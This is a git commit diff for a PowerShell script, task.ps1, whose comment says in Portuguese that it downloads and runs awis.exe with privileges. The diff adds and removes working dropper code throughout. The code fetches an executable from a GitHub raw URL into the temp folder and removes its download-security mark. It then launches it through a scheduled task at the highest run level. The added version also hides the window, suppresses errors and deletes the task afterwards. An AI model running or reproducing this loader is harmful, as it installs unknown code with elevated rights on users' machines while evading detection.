52781967b5e3997033e89ff431a43d28ca427895
user337666 <129235545+user337666@users.noreply.github.com>
2025-09-18 19:06:05 -0300

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -1,9 +1,7 @@
 # Baixar e executar awis.exe com privilégios
-$u = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
-$p = "$env:TEMP\awis.exe"
-Invoke-WebRequest $u -OutFile $p
-Unblock-File $p -ErrorAction SilentlyContinue
-schtasks /Create /TN "RunTask" /TR "powershell -c Start-Process $p" /SC ONCE /ST 00:00 /RL HIGHEST /F
-schtasks /Run /TN "RunTask"
-Start-Sleep -Seconds 10
-schtasks /Delete /TN "RunTask" /F
+$url = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
+$path = "$env:TEMP\awis.exe"
+Invoke-WebRequest $url -OutFile $path -ErrorAction SilentlyContinue
+Unblock-File $path -ErrorAction SilentlyContinue
+schtasks /Create /TN "RunTask" /TR "powershell -c Start-Process '$path' -WindowStyle Hidden" /SC ONCE /ST 00:00 /RL HIGHEST /F
+if ($?) { schtasks /Run /TN "RunTask"; Start-Sleep -Seconds 10; schtasks /Delete /TN "RunTask" /F }
